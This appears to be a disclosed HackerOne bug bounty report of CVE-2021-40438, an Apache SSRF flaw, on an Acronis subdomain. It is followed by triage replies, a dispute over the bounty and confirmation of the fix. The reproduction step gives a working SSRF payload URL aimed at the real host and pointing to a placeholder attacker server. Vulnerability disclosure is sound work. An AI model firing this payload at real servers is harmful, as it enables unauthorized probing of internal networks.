title: CVE-2021-40438 on cp-eu2.acronis.com

profile.name: Acronis
profile.about: Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure

vulnerability_information:
Hi team

## Summary
CVE-2021-40438 on cp-eu2.acronis.com

## Steps To Reproduce

 `
https://cp-eu2.acronis.com?unix:|http://YOUR_HOST/
`


## Recommendations
patch apache


Thanks

## Impact

ssrf

activities.message:
Hi @savik

Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.

Meanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).

Hi @savik 

I cannot reproduce the issue based on your initial description. Please provide a clear instruction and a video proof. Also, since the claimed impact is SSRF, were you able to actually find any internal resources using this method?

Please reply with additional information describing your reasoning. Including a working proof-of-concept can be incredibly helpful in our assessment of these claims. Otherwise, feel free to self-close the report.

Hi @iradostev 
> I cannot reproduce the issue based on your initial description

Did you change `http://YOUR_HOST/` ?

> were you able to actually find any internal resources using this method

I didn't try. It's actually blind ssrf.
Yes, I've changed the host to a public one controlled by me and it didn't receive any requests
Acronis please be advised that you disclose private information through the first reporter video : )

@nagli yeah, my mistake that i didn't recheck.

Looks like h1 should disable `Record a demo` feature in bugs list mode

@all please stop posting videos containing reports to other Bug Bounty programs. This directly violates H1 non-disclosure policy.

@nagli thanks for noticing that, though I believe the information was not disclosed by Acronis ;)

Thanks for participating in Acronis bug bounty program! Bounty is transferred to your account.
Happy bug hunting and we are waiting for new reports from you.

150$ for a critical one ??!!😂😂😂😂
Come on team its not fair by your side

@modjojojo_60, 
Please check our [policy](https://hackerone.com/acronis). This domain is in Tier 3 scope (Web). The bounty for non-blind SSRF is outlined in the corresponding table.
could you please remove me from this?
plz remove me from this report

Thanks for catching this bug!

We have fixed it, please confirm that you are no longer able to reproduce the issue.
plz remove me from this report
